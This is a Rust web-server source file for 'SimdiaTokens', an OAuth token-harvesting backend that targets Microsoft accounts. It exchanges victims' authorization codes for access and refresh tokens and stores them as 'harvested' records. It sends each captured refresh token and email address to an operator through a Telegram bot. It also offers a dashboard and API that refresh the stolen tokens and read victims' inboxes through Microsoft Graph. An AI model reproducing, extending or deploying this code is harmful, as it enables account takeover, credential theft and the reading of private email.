use actix_web::{web, App, HttpServer, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
use sqlx::{SqlitePool, sqlite::SqlitePoolOptions};
use chrono::{Utc, Duration};
use uuid::Uuid;
use std::env;
use dotenv::dotenv;
use reqwest::Client;
use rand::Rng;

// ------------------- CONFIGURATION -------------------
#[derive(Debug, Clone)]
struct AppConfig {
    client_id: String,
    client_secret: String,
    redirect_uri: String,
    first_party_ids: Vec<String>,
    database_url: String,
    telegram_bot_token: Option<String>,
    telegram_chat_id: Option<String>,
}

impl AppConfig {
    fn from_env() -> Self {
        Self {
            client_id: env::var("CLIENT_ID").expect("CLIENT_ID not set"),
            client_secret: env::var("CLIENT_SECRET").expect("CLIENT_SECRET not set"),
            redirect_uri: env::var("REDIRECT_URI").expect("REDIRECT_URI not set"),
            first_party_ids: vec![
                "04b07795-8ddb-461a-bbee-02f9e1bf7b46".to_string(),
                "a672d62c-fc7b-4e81-a576-e60dc46e951d".to_string(),
                "d3590ed6-52b3-4102-aeff-aad2292ab01c".to_string(),
            ],
            database_url: env::var("DATABASE_URL").unwrap_or_else(|_| "sqlite::memory:".to_string()),
            telegram_bot_token: env::var("TELEGRAM_BOT_TOKEN").ok(),
            telegram_chat_id: env::var("TELEGRAM_CHAT_ID").ok(),
        }
    }
}

#[derive(Debug, sqlx::FromRow, Serialize)]
struct HarvestedToken {
    id: String,
    email: Option<String>,
    access_token: String,
    refresh_token: String,
    expires_at: chrono::DateTime<Utc>,
    captured_at: chrono::DateTime<Utc>,
    source: String,
}

struct AppState {
    pool: SqlitePool,
    config: AppConfig,
    http_client: Client,
}

fn generate_id() -> String {
    Uuid::new_v4().to_string()
}

async fn send_telegram_notification(config: &AppConfig, refresh_token: &str, email: &str) {
    if let (Some(token), Some(chat_id)) = (&config.telegram_bot_token, &config.telegram_chat_id) {
        let message = format!("🎯 *New Token Captured!*\n\nEmail: `{}`\nRefresh Token: `{}`\nTime: {}", email, refresh_token, Utc::now());
        let url = format!("https://api.telegram.org/bot{}/sendMessage", token);
        let params = [
            ("chat_id", chat_id.as_str()),
            ("text", message.as_str()),
            ("parse_mode", "Markdown"),
        ];
        let _ = reqwest::Client::new()
            .post(&url)
            .form(&params)
            .send()
            .await;
    }
}

async fn fetch_user_email(access_token: &str) -> Option<String> {
    let client = Client::new();
    let resp = client
        .get("https://graph.microsoft.com/v1.0/me")
        .header("Authorization", format!("Bearer {}", access_token))
        .send()
        .await
        .ok()?;
    let body: serde_json::Value = resp.json().await.ok()?;
    body.get("userPrincipalName")?.as_str().map(|s| s.to_string())
}

#[derive(Deserialize)]
struct ExchangeQuery {
    code: String,
}

async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppState>) -> impl Responder {
    let code = &query.code;
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "authorization_code"),
        ("code", code.as_str()),
        ("redirect_uri", state.config.redirect_uri.as_str()),
    ];
    let client = &state.http_client;
    let res = client.post(token_url).form(&params).send().await;
    match res {
        Ok(resp) => {
            let body: serde_json::Value = resp.json().await.unwrap_or_default();
            if let (Some(access_token), Some(refresh_token)) = (body.get("access_token").and_then(|v| v.as_str()), body.get("refresh_token").and_then(|v| v.as_str())) {
                let id = generate_id();
                let expires_in = body.get("expires_in").and_then(|v| v.as_i64()).unwrap_or(3600);
                let expires_at = Utc::now() + Duration::seconds(expires_in);
                let email = fetch_user_email(access_token).await;
                println!("Attempting to insert token for email: {:?}", email);  // <-- moved here
                sqlx::query(
                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source) VALUES (?, ?, ?, ?, ?, ?, ?)"
                )
                .bind(&id)
                .bind(&email)
                .bind(access_token)
                .bind(refresh_token)
                .bind(expires_at)
                .bind(Utc::now())
                .bind("oauth_app")
                .execute(&state.pool)
                .await
                .ok();
                if let Some(email) = email {
                    send_telegram_notification(&state.config, refresh_token, &email).await;
                }
                HttpResponse::Ok().json(serde_json::json!({"status": "token_stored"}))
            } else {
                HttpResponse::BadRequest().json(serde_json::json!({"error": "token_exchange_failed", "details": body}))
            }
        }
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": format!("request_failed: {}", e)}))
    }
}

// JSON API: list all tokens
async fn api_tokens(state: web::Data<AppState>) -> impl Responder {
    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested ORDER BY captured_at DESC")
        .fetch_all(&state.pool)
        .await
        .unwrap_or_default();
    HttpResponse::Ok().json(rows)
}

// JSON API: get inbox emails for a token
#[derive(Deserialize)]
struct InboxApiQuery {
    token_id: String,
}

async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?")
        .bind(&query.token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    if let Some(token) = row {
        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
        let access = fresh_access.unwrap_or(token.access_token);
        let client = reqwest::Client::new();
        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=50&$orderby=receivedDateTime DESC")
            .header("Authorization", format!("Bearer {}", access))
            .send()
            .await;
        match resp {
            Ok(r) => {
                let body: serde_json::Value = r.json().await.unwrap_or_default();
                HttpResponse::Ok().json(body)
            }
            Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e.to_string()}))
        }
    } else {
        HttpResponse::NotFound().json(serde_json::json!({"error": "Token not found"}))
    }
}

// Helper: refresh access token
async fn refresh_access_token(state: &AppState, refresh_token: &str) -> Option<String> {
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "refresh_token"),
        ("refresh_token", refresh_token),
    ];
    let res = state.http_client.post(token_url).form(&params).send().await.ok()?;
    let body: serde_json::Value = res.json().await.ok()?;
    body.get("access_token").and_then(|v| v.as_str()).map(|s| s.to_string())
}


// HTML admin dashboard (with View Inbox button)
async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested ORDER BY captured_at DESC")
        .fetch_all(&state.pool)
        .await
        .unwrap_or_default();
    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>
        body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}
        table{width:100%;border-collapse:collapse;}
        th,td{padding:10px;border-bottom:1px solid #333;}
        .token{font-family:monospace;font-size:12px;}
        button{background:#0078d4;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;}
        button:hover{background:#005a9e;}
        a{text-decoration:none;}
    </style></head><body><h1>SimdiaTokens Harvested Tokens</h1>
    <table><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th><th>Actions</th></tr>"#);
    for token in rows {
        let email = token.email.as_deref().unwrap_or("unknown");
        let refresh_short = if token.refresh_token.len() > 20 { format!("{}...", &token.refresh_token[..20]) } else { token.refresh_token.clone() };
        html.push_str(&format!(
            r#"<tr><td>{}</td><td>{}</td><td class='token'>{}</td><td>{}</td><td>{}</td>
            <td><a href='/inbox_view?token_id={}'><button>📧 View Inbox</button></a></td></tr>"#,
            token.id, email, refresh_short, token.expires_at, token.source, token.id
        ));
    }
    html.push_str("</table></body></html>");
    HttpResponse::Ok().content_type("text/html").body(html)
}

// HTML inbox view (fallback)
async fn inbox_view_html(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?")
        .bind(&query.token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    if let Some(token) = row {
        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
        let access = fresh_access.unwrap_or(token.access_token);
        let client = reqwest::Client::new();
        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=20&$orderby=receivedDateTime DESC")
            .header("Authorization", format!("Bearer {}", access))
            .send()
            .await;
        match resp {
            Ok(r) => {
                let data: serde_json::Value = r.json().await.unwrap_or_default();
                let mut html = String::from(r#"<!DOCTYPE html><html><head><title>Inbox</title><style>body{font-family:Arial;background:#f0f2f5;margin:0;padding:20px;}h2{color:#333;}.email{background:white;margin-bottom:10px;padding:15px;border-radius:8px;}</style></head><body><h1>Inbox</h1>"#);
                if let Some(msgs) = data.get("value").and_then(|v| v.as_array()) {
                    for msg in msgs {
                        let subject = msg.get("subject").and_then(|v| v.as_str()).unwrap_or("(no subject)");
                        let from = msg.get("from").and_then(|v| v.get("emailAddress")).and_then(|v| v.get("address")).and_then(|v| v.as_str()).unwrap_or("unknown");
                        let received = msg.get("receivedDateTime").and_then(|v| v.as_str()).unwrap_or("");
                        let body_preview = msg.get("bodyPreview").and_then(|v| v.as_str()).unwrap_or("");
                        html.push_str(&format!("<div class='email'><b>{}</b><br>From: {}<br>{}<br>{}</div><hr>", subject, from, received, body_preview));
                    }
                } else {
                    html.push_str("<p>No emails found</p>");
                }
                html.push_str("</body></html>");
                HttpResponse::Ok().content_type("text/html").body(html)
            }
            Err(e) => HttpResponse::InternalServerError().body(format!("Error: {}", e))
        }
    } else {
        HttpResponse::NotFound().body("Token not found")
    }
}

async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
    sqlx::query(
        "CREATE TABLE IF NOT EXISTS harvested (
            id TEXT PRIMARY KEY,
            email TEXT,
            access_token TEXT NOT NULL,
            refresh_token TEXT NOT NULL,
            expires_at DATETIME NOT NULL,
            captured_at DATETIME NOT NULL,
            source TEXT NOT NULL
        )"
    ).execute(pool).await?;
    Ok(())
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    dotenv().ok();
    let config = AppConfig::from_env();

    let db_path = config.database_url
        .strip_prefix("sqlite:///")
        .or_else(|| config.database_url.strip_prefix("sqlite://"))
        .or_else(|| config.database_url.strip_prefix("sqlite:"))
        .unwrap_or(&config.database_url)
        .to_string();

    if db_path != ":memory:" {
        // Ensure parent directory exists
        if let Some(parent) = std::path::Path::new(&db_path).parent() {
            if !parent.as_os_str().is_empty() {
                std::fs::create_dir_all(parent)
                    .expect("Failed to create database directory");
            }
        }

        // Test that we can actually write to the directory
        let test_file = std::path::Path::new(&db_path)
            .parent()
            .unwrap_or(std::path::Path::new("."))
            .join(".write_test");
        match std::fs::write(&test_file, b"test") {
            Ok(_) => {
                std::fs::remove_file(&test_file).ok();
                println!("Write test passed on directory");
            }
            Err(e) => {
                panic!("Directory is NOT writable: {}. Check Railway volume permissions.", e);
            }
        }
    }

    // Use ?mode=rwc to force SQLite to create the file if it doesn't exist
    let connect_url = if db_path == ":memory:" {
        config.database_url.clone()
    } else {
        format!("sqlite:///{}?mode=rwc", db_path)
    };

    println!("Connecting to: {}", connect_url);

    let pool = SqlitePoolOptions::new()
        .max_connections(5)
        .connect(&connect_url)
        .await
        .expect("Failed to create database pool");

    init_db(&pool).await.expect("Failed to init DB");
    let http_client = Client::new();
    let app_state = web::Data::new(AppState { pool, config, http_client });

    let port = std::env::var("PORT").unwrap_or_else(|_| "8080".to_string());
    let port = port.parse::<u16>().unwrap_or(8080);

    println!("SimdiaTokens backend running on http://0.0.0.0:{}", port);
    HttpServer::new(move || {
        App::new()
            .app_data(app_state.clone())
            .route("/exchange", web::get().to(exchange_code))
            .route("/admin", web::get().to(admin_dashboard))
            .route("/inbox_view", web::get().to(inbox_view_html))
            .route("/api/tokens", web::get().to(api_tokens))
            .route("/api/inbox", web::get().to(api_inbox))
    })
    .bind(("0.0.0.0", port))?
    .run()
    .await
}